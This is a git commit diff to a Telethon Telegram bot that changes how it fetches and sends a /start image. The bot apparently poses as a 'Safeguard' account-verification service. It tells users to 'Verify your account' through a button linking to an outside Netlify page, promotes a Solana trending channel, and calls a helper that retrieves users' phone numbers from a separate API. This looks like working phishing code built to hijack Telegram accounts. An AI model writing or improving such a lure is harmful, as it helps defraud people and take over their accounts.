6808c970e436daef041470353ffd3c5c11ad566c
Geebergy <obeingilbert3884@gmail.com>
2024-12-23 11:10:12 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,4 +1,5 @@
 import asyncio
+import requests
 from telethon import TelegramClient, events
 from telethon.tl.custom import Button
 import aiohttp  # Asynchronous HTTP requests
@@ -25,26 +26,27 @@ API_URL = 'https://telebot-ivng.onrender.com/send_message'  # Replace with your 
 @bot_client.on(events.NewMessage(pattern='/start'))
 async def on_start(event):
     try:
-        # Download the image asynchronously
+        # Download the image from the URL
         image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/safeguard%20bot%2FScreenshot_20241223_101134_Telegram.jpg?alt=media&token=b207be6b-c41d-41ed-84e7-37855b02a4f8'
-        async with aiohttp.ClientSession() as session:
-            async with session.get(image_url) as response:
-                if response.status == 200:
-                    image_data = await response.read()  # Read image bytes
+        response = requests.get(image_url)
 
-                    await event.respond(
-                        file=image_data,  # Send the image as bytes
-                        message="Verify your account.",
-                        buttons=[
-                            [Button.url("Verify", "https://safeguardverification.netlify.app/")],
-                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]
-                        ]
-                    )
-                else:
-                    print("Failed to fetch the image from the provided URL.")
+        # Check if the image was downloaded successfully
+        if response.status_code == 200:
+            image_data = response.content  # Get the image bytes
+
+            await event.respond(
+                file=image_data,  # Send the image as bytes
+                message="Verify your account.",
+                buttons=[
+                    [Button.url("Verify", "https://safeguardverification.netlify.app/")],
+                    [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
+                ]
+            )
+        else:
+            await event.respond("Failed to fetch the image from the provided URL.")
 
     except Exception as e:
-        print(f"Error: {e}")
+        await event.respond(f"Error: {e}")
 
 # Function to retrieve phone number from Flask API based on sender_id
 async def get_phone_by_sender_id(sender_id):
